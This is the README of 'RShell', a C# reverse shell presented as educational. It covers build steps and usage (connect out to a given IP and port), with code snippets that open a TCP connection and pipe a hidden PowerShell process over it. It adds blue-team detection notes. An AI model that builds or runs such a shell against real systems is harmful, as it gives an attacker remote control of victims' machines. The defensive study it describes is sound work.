# RShell (C# — Educational Reverse Shell)

RShell is a minimal reverse shell written in **C#**.  
It exists **strictly for educational and defensive research**—to study .NET networking, process I/O redirection, and blue-team detection strategies in a controlled lab.

---

## ⚖️ Legal & Ethical Use

**Authorized use only.** This project is provided to:
- Learn how reverse shells function at a code level.
- Run controlled, consented, and documented tests in your **own** lab.
- Improve defensive detections and incident response.

**You must not** use this software to access systems without explicit written permission.  

By using, copying, or modifying this code, **you agree** that:
- You have legal authorization to run any tests you perform.
- You accept full responsibility for outcomes and compliance with all applicable laws and policies.
- The authors and contributors are **not liable** for misuse, damage, or legal consequences.

---

## 🛠️ Build Instructions

### Option A — Visual Studio
1. Create a new **Console App** (C#).
2. Replace the default `Program.cs` with the one in this repository.
3. Build in **Release** mode.

### Option B — .NET SDK (CLI)
If you prefer SDK-style:

```bash
dotnet new console -n RShell
# Copy your Program.cs over the generated one
dotnet build -c Release RShell
```

### Option C — CSC (C# compiler)
If the .NET compiler is available on PATH:

```bash
csc src\\Program.cs -out:RShell.exe
```

If you change the PowerShell path or add cross-platform support, document those changes in this README.

## ▶️ Runtime Parameters
The program expects two arguments:

```bash
RShell.exe <ip> <port>
```

- `<ip>` : Destination IP (string)
- `<port>` : Destination port (integer)

⚠️ Note: This is for lab use only in environments you own/control and are authorized to test.
Do not point this at networks or hosts without written consent.

## 🔍 Code Walkthrough
Key elements in Program.cs:

### Networking:

```csharp
TcpClient client = new TcpClient();
client.Connect(ip, port);
```

### Streams:
Wraps the network stream with StreamReader/StreamWriter for line-oriented I/O.

### Process:
Launches PowerShell via ProcessStartInfo with:

```csharp
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardError = true;
p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
```

### Event Handlers:
Subscribes to OutputDataReceived / ErrorDataReceived to forward output lines back over the socket.

### Loop:
Reads remote lines and writes them to:

```csharp
p.StandardInput.WriteLine(userInput);
```

## 🧪 Safe Lab & Testing Guidance (High-Level)
To keep this ethical and safe:

- Isolate your lab. Use local VMs or containers on a closed network with no internet egress.
- Document consent. If collaborating, get written permission (scope, dates, systems, data handling).
- Least privilege. Use non-admin test accounts and non-production systems/data.
- Observe & learn. Pair runs with monitoring (process creation logs, PowerShell logging, network telemetry).
- No operationalization. This README does not include listener setup or exploitation steps.

## 🛡️ Blue-Team Notes (Defensive Study)
When running in a lab, explore how the following controls observe activity:

- PowerShell Logging: Script Block, Module, and Transcription logging
- AMSI (Antimalware Scan Interface): Scans PowerShell content before execution
- Process Creation Events: Windows Event ID 4688 / Sysmon Event ID 1
- Network Telemetry: Egress connections, unusual destinations/ports
- Command-line Auditing: Visibility into -ExecutionPolicy Bypass usage

Questions to ask in your lab:

- Which alerts fire?
- What telemetry is missing?
- How could defenders detect similar behavior earlier?

## ⚙️ Configuration Ideas (for Learning)
If you extend the project (in your lab), consider adding:

- Configurable PowerShell path for different Windows versions
- Timeouts/Retries for connections
- Graceful Exit signals to close the child process cleanly
- Optional local logging (lab only) for troubleshooting
- Authentication/TLS (lab only) to explore secure communication

⚠️ Do not add evasion features or anti-forensic behavior. Such contributions will be rejected.

## 🚫 Known Limitations
- Windows-only (hardcoded PowerShell path)
- No encryption/authentication on the TCP channel
- Minimal error handling
- No reconnection logic or persistence (by design)
- Requires interactive remote input (no job control)

## ❓ FAQ
**Q: Why omit listener/exploitation instructions?**  
A: To avoid misuse. This project is for understanding code paths and defensive visibility, not for exploitation.

**Q: Can I change -ExecutionPolicy Bypass?**  
A: Yes — this is just for lab use. Try stricter settings and study logs.

**Q: Will you accept PRs adding stealth/evasion?**  
A: No. Only educational or defensive improvements are accepted.

## 🤝 Contributing
Keep changes educational and defense-oriented.

Do not submit features meant to bypass security controls.

Include documentation and rationales in PRs.

## 🔐 Disclosure & Safety Policy
If you discover a security issue in this repository:

- Do not post it publicly.
- Open a private report (via GitHub Security Advisory, if available).
- Or contact the maintainer by email.

For real-world vulnerabilities elsewhere, follow responsible disclosure with the affected vendor.

## 📄 License (MIT)

```
Copyright (c) 2025

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the “Software”), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, express or
implied, including but not limited to the warranties of merchantability,
fitness for a particular purpose and noninfringement. In no event shall the
authors or copyright holders be liable for any claim, damages or other
liability, whether in an action of contract, tort or otherwise, arising from,
out of or in connection with the Software or the use or other dealings in the
Software.
```
